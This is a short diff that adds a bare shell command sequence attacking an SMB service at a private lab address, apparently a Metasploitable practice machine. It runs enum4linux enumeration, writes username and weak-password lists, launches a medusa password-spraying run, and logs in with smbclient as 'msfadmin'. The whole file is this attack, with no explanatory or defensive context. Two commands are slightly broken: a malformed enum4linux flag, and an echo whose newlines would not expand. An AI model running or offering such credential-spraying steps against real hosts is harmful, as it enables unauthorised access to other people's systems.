@@ -1,0 +1,6 @@
+enum4linux - a 192.168.56.101 | tee enum4_output.txt
+less enum4_output.txt
+echo "user\nmsfadmin\nservice" > smb_users.txt
+echo -e "password\n123456\nWelcome123\nmsfadmin" > spray_pass.txt
+medusa -h 192.168.56.101 -U smb_users.txt -P spray_pass.txt -M smbnt -t 2 -T 50
+smbclient -L //192.168.56.101 -U msfadmin 
